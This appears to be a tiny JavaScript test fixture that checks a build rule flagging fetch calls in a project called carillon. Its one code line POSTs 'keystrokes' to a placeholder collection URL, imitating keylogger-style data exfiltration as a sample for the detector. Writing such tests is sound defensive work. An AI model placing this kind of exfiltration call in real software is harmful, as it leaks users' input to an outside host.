// Fixture proving the "fetch-call" rule bites: this calls fetch(...),
// which a real, honest carillon build must never do.
fetch('https://example.com/collect', { method: 'POST', body: 'keystrokes' });
